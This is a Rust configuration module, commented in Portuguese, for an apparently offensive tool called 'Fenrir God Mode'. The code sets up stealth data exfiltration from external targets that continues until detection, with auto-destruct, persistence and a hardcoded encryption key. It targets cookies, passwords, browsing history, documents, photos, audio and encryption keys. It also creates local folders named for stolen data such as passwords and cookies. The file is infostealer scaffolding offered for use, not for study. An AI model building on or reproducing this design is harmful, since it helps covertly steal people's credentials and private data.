use serde::{Deserialize, Serialize};
use std::path::PathBuf;

// 🔴 FENRIR GOD MODE - CONFIGURAÇÃO OPERACIONAL

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FenrirConfig {
    pub god_mode: GodModeConfig,
    pub rosnar: RosnarConfig,
    pub morder: MorderConfig,
    pub devorar: DevorarConfig,
    pub paths: PathConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GodModeConfig {
    pub always_active: bool,
    pub stealth_level: u8, // 1-10
    pub auto_destruct: bool,
    pub encryption_key: String,
    pub persistent_mode: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RosnarConfig {
    pub scan_depth: ScanDepth,
    pub heuristic_analysis: bool,
    pub evolutionary_response: bool,
    pub auto_counter_attack: bool,
    pub sample_collection: bool,
    pub real_time_monitoring: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MorderConfig {
    pub target_type: TargetType,
    pub extraction_depth: ExtractionDepth,
    pub real_time_backup: bool,
    pub stealth_exfiltration: bool,
    pub data_categories: Vec<DataCategory>,
    pub continue_until_detected: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DevorarConfig {
    pub reverse_engineering: bool,
    pub rust_reimplementation: bool,
    pub documentation_generation: bool,
    pub intellectual_property_extraction: bool,
    pub create_improved_versions: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PathConfig {
    pub base_dir: PathBuf,
    pub samples_dir: PathBuf,
    pub reports_dir: PathBuf,
    pub stolen_data_dir: PathBuf,
    pub devored_targets_dir: PathBuf,
    pub trophies_dir: PathBuf,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ScanDepth {
    Shallow,  // Processos visíveis
    Deep,     // Arquivos e configurações
    Complete, // Sistema completo incluindo firmware
    Brutal,   // TUDO + memória criptografada
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TargetType {
    External,
    Internal,
    Network,
    WiFi,
    Server,
    Mobile,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ExtractionDepth {
    Surface,  // Acesso público
    Deep,     // Arquivos do usuário
    Complete, // Sistema completo
    System,   // Arquivos de sistema
    Brutal,   // Extração brutal completa
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum DataCategory {
    Cookies,
    History,
    Passwords,
    Documents,
    Photos,
    Videos,
    Audio,
    Texts,
    SystemFiles,
    EncryptionKeys,
    Database,
    Configuration,
}

impl Default for FenrirConfig {
    fn default() -> Self {
        let home_dir = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
        let fenrir_dir = home_dir.join(".fenrir");

        Self {
            god_mode: GodModeConfig {
                always_active: true, // GOD MODE SEMPRE ATIVADO
                stealth_level: 10,
                auto_destruct: true,
                encryption_key: "FENRIR_GOD_MODE_KEY_2025".to_string(),
                persistent_mode: true,
            },
            rosnar: RosnarConfig {
                scan_depth: ScanDepth::Complete,
                heuristic_analysis: true,
                evolutionary_response: true,
                auto_counter_attack: true,
                sample_collection: true,
                real_time_monitoring: true,
            },
            morder: MorderConfig {
                target_type: TargetType::External,
                extraction_depth: ExtractionDepth::Brutal,
                real_time_backup: true,
                stealth_exfiltration: true,
                data_categories: vec![
                    DataCategory::Cookies,
                    DataCategory::History,
                    DataCategory::Passwords,
                    DataCategory::Documents,
                    DataCategory::Photos,
                    DataCategory::Videos,
                    DataCategory::Audio,
                    DataCategory::Texts,
                    DataCategory::SystemFiles,
                    DataCategory::EncryptionKeys,
                ],
                continue_until_detected: true,
            },
            devorar: DevorarConfig {
                reverse_engineering: true,
                rust_reimplementation: true,
                documentation_generation: true,
                intellectual_property_extraction: true,
                create_improved_versions: true,
            },
            paths: PathConfig {
                base_dir: fenrir_dir.clone(),
                samples_dir: fenrir_dir.join("samples"),
                reports_dir: fenrir_dir.join("relatorios"),
                stolen_data_dir: fenrir_dir.join("preso"),
                devored_targets_dir: fenrir_dir.join("devorado"),
                trophies_dir: fenrir_dir.join("trophies"),
            },
        }
    }
}

impl FenrirConfig {
    pub fn load() -> anyhow::Result<Self> {
        let config_path = dirs::home_dir()
            .unwrap_or_else(|| PathBuf::from("."))
            .join(".fenrir")
            .join("config.toml");

        if config_path.exists() {
            let config_str = std::fs::read_to_string(&config_path)?;
            let config: FenrirConfig = toml::from_str(&config_str)?;
            Ok(config)
        } else {
            let config = Self::default();
            config.save()?;
            Ok(config)
        }
    }

    pub fn save(&self) -> anyhow::Result<()> {
        let config_path = dirs::home_dir()
            .unwrap_or_else(|| PathBuf::from("."))
            .join(".fenrir");

        std::fs::create_dir_all(&config_path)?;

        let config_str = toml::to_string_pretty(self)?;
        std::fs::write(config_path.join("config.toml"), config_str)?;

        // Criar estrutura de pastas operacionais
        self.create_directories()?;

        Ok(())
    }

    pub fn create_directories(&self) -> anyhow::Result<()> {
        std::fs::create_dir_all(&self.paths.samples_dir)?;
        std::fs::create_dir_all(&self.paths.reports_dir)?;
        std::fs::create_dir_all(&self.paths.stolen_data_dir)?;
        std::fs::create_dir_all(&self.paths.devored_targets_dir)?;
        std::fs::create_dir_all(&self.paths.trophies_dir)?;

        // Subdiretórios de dados roubados
        std::fs::create_dir_all(self.paths.stolen_data_dir.join("cookies"))?;
        std::fs::create_dir_all(self.paths.stolen_data_dir.join("historico"))?;
        std::fs::create_dir_all(self.paths.stolen_data_dir.join("senhas"))?;
        std::fs::create_dir_all(self.paths.stolen_data_dir.join("documentos"))?;
        std::fs::create_dir_all(self.paths.stolen_data_dir.join("fotos_videos"))?;
        std::fs::create_dir_all(self.paths.stolen_data_dir.join("audio"))?;
        std::fs::create_dir_all(self.paths.stolen_data_dir.join("textos"))?;

        Ok(())
    }

    pub fn is_god_mode_active(&self) -> bool {
        self.god_mode.always_active
    }

    pub fn get_stealth_multiplier(&self) -> f64 {
        self.god_mode.stealth_level as f64 / 10.0
    }
}

// 🔥 REGRAS OPERACIONais CODIFICADAS
impl FenrirConfig {
    /// Regra: ROSNAR sempre é alvo interno
    pub fn is_rosnar_target_internal(&self) -> bool {
        true
    }

    /// Regra: MORDER sempre é alvo externo
    pub fn is_morder_target_external(&self) -> bool {
        true
    }

    /// Regra: DEVORAR faz engenharia reversa completa
    pub fn should_devorar_reverse_engineer(&self) -> bool {
        self.devorar.reverse_engineering && self.devorar.rust_reimplementation
    }

    /// Regra: GOD MODE sempre ativo no modo interativo
    pub fn should_activate_god_mode_automatically(&self) -> bool {
        self.god_mode.always_active
    }

    /// Regra: Continuar extraindo até detectar
    pub fn should_continue_extraction_until_detected(&self) -> bool {
        self.morder.continue_until_detected
    }

    /// Regra: Backup em tempo real dos dados roubados
    pub fn should_backup_real_time(&self) -> bool {
        self.morder.real_time_backup
    }
}

// 🐺 CONSTANTES OPERACIONAL
pub const FENRIR_VERSION: &str = "2.0.0-GOD-MODE";
pub const FENRIR_MOTTO: &str = "MORDE NA JUGULAR, SEGURA A MORDIDA, DEVORA ATÉ O OSSO";
pub const FENRIR_ENCRYPTION_ALGORITHM: &str = "AES-256-GCM";
